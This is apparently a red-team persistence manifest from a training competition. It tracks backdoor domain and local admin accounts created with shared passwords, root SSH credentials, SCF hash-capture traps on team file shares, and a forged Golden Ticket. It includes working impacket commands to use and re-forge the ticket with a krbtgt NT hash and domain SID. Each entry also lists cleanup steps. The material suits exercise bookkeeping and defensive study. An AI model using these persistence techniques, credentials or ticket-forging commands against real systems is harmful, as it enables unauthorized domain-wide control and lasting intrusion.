# Persistence Manifest — TRAINING (Run #4 Day 2)

Updated 2026-03-21 with JY intel sync. Reflects actual end-of-Day-1 state.

---

## Active Persistence (Verified or Likely Active Entering Day 2)

| Target IP | Mechanism Type | Mechanism Name | Deploy Time | Last Verified | Status | Cleanup Command | Operator |
|-----------|----------------|----------------|-------------|---------------|--------|-----------------|----------|
| 10.100.113.98 (HARVESTMAN) | OTHER | Golden Ticket — Administrator@ESS.DEFENSE stored at /usr/share/mcp-kali-server/Administrator.ccache | ~20:00 | JY ~20:30 | ACTIVE | Reset krbtgt password TWICE consecutively | JY |
| 10.100.113.98 (HARVESTMAN) | ACCOUNT | ntpmon:P@ssw0rd — domain account, local Administrators on HARVESTMAN | ~20:30 | JY ~20:30 (just created) | UNVERIFIED Day 2 | Remove-ADUser ntpmon | JY |
| 10.100.113.98 (HARVESTMAN) | ACCOUNT | logd:P@ssw0rd — domain account, local Administrators on HARVESTMAN | ~20:30 | JY ~20:30 | UNVERIFIED Day 2 | Remove-ADUser logd | JY |
| 10.100.113.98 (HARVESTMAN) | ACCOUNT | auditd:P@ssw0rd — domain account, local Administrators on HARVESTMAN | ~20:30 | JY ~20:30 | UNVERIFIED Day 2 | Remove-ADUser auditd | JY |
| 10.100.113.98 (HARVESTMAN) | ACCOUNT | rpcmon:P@ssw0rd — domain account, local Administrators on HARVESTMAN | ~20:30 | JY ~20:30 | UNVERIFIED Day 2 | Remove-ADUser rpcmon | JY |
| 10.100.113.98 (HARVESTMAN) | ACCOUNT | defragd:P@ssw0rd — domain account, local Administrators on HARVESTMAN | ~20:30 | JY ~20:30 | UNVERIFIED Day 2 | Remove-ADUser defragd | JY |
| 10.100.113.98 (HARVESTMAN) | ACCOUNT | testuser:P@ssw0rd — domain account, local Administrators on HARVESTMAN | ~20:30 | JY ~20:30 | UNVERIFIED Day 2 | Remove-ADUser testuser | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | rtops:P@ssw0rd — local account, local Administrators, WinRM --local-auth | ~18:30 | JY ~19:20 | ACTIVE | net user rtops /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | svcmon:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user svcmon /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | backupsvc:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user backupsvc /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | ntpmon:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user ntpmon /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | logd:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user logd /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | auditd:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user auditd /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | rpcmon:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user rpcmon /delete | JY |
| 10.100.113.42 (BIRDMITE) | ACCOUNT | defragd:P@ssw0rd — local Admin | ~18:30 | — | UNVERIFIED | net user defragd /delete | JY |
| 10.100.113.22 (bumblebee) | SSHKEY | root:BugsEverywhere! SSH password auth | ~18:00 | JY ~19:15 | ACTIVE | passwd root (change password) | JY |
| 10.100.113.99 (WOPR) | OTHER | rt_key — impacket smbclient as administrator (key on JY jumpbox) | ~17:30 | JY ~19:20 | ACTIVE (JY jumpbox) | Remove rt_key from share; disable key | JY |
| 10.100.113.99 (WOPR) | ACCOUNT | ntpmon — sudo account, uid=0 verified | ~17:30 | JY ~19:20 | ACTIVE | userdel ntpmon | JY |
| 10.100.113.99 (WOPR) | ACCOUNT | logd — sudo account | ~17:30 | JY (batch) | ACTIVE (unverified individually) | userdel logd | JY |
| 10.100.113.99 (WOPR) | ACCOUNT | auditd — sudo account | ~17:30 | JY (batch) | ACTIVE (unverified individually) | userdel auditd | JY |
| 10.100.113.99 (WOPR) | ACCOUNT | rpcmon — sudo account | ~17:30 | JY (batch) | ACTIVE (unverified individually) | userdel rpcmon | JY |
| 10.100.113.99 (WOPR) | ACCOUNT | defragd — sudo account | ~17:30 | JY (batch) | ACTIVE (unverified individually) | userdel defragd | JY |
| 10.100.113.143 (bedbug) | ACCOUNT | dc_joiners:securepassword SSH → su (no password) = root | Day 1 | JY Day 1 | ACTIVE | Change dc_joiners password or disable account | JY |

## Active SCF Traps (Passive — Competition Cleanup)

| Target IP | Mechanism Type | Mechanism Name | Status | Cleanup |
|-----------|----------------|----------------|--------|---------|
| 10.100.101.98 (Team 1) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.103.98 (Team 3) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.104.98 (Team 4) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.106.98 (Team 6) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.107.98 (Team 7) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.109.98 (Team 9) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.110.98 (Team 10) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.111.98 (Team 11) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.112.98 (Team 12) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |
| 10.100.113.98 (Team 13) | OTHER | capture.scf in \\HARVESTMAN\Stark_Public\ | ACTIVE | del \\HARVESTMAN\Stark_Public\capture.scf |

## Burned Mechanisms (Day 1)

| Target | Mechanism | Status |
|--------|-----------|--------|
| All Linux hosts | svc_update SSH authorized_keys | BURNED — removed overnight by blue team |
| HARVESTMAN (.98) + BIRDMITE (.42) | schtask "Windows Update Helper" | UNVERIFIED — likely burned |
| cockroach (.100) | All sudo accounts (ntpmon/logd/auditd/rpcmon/defragd) | BURNED |
| cockroach (.100) | root SSH (BugsEverywhere! password) | BURNED — password changed |
| cockroach (.100) | Wazuh backdoor user svcupdate:Redteamwins! | UNVERIFIED (cockroach fully burned) |
| bumblebee (.22) | sudo accounts (ntpmon/logd/auditd/rpcmon/defragd) | BURNED — blue team purged |

---

## Golden Ticket — CRITICAL USAGE NOTE

```bash
# Access HARVESTMAN via Golden Ticket (requires +7h clock offset)
cd /usr/share/mcp-kali-server
FAKETIME='+7h' KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass ess.defense/administrator@10.100.113.98

# Re-forge if needed
impacket-ticketer -nthash 73b2f65b22a3f871a79809650f885b08 \
  -domain-sid S-1-5-21-2606991437-2088995776-1615380383 \
  -domain ESS.DEFENSE Administrator
```

Valid until krbtgt reset TWICE. Single reset insufficient.

---

### Status Values

ACTIVE: persistence verified and functioning.
UNVERIFIED: deployed but not yet verified Day 2.
BURNED: detected and removed by blue team.
CLEANED: removed by red team as part of cleanup.

### Type Values

TASK (scheduled task), REGISTRY (run key or other registry persistence), WMI (WMI event subscription), SERVICE (Windows service or systemd unit), CRON (cron job), SSHKEY (SSH authorized key), WEBSHELL (web shell file), ACCOUNT (backdoor OS user account), DB-ACCOUNT (backdoor database user — MySQL, MariaDB, PostgreSQL), ADS (Apparition Delivery System deployment), OTHER.
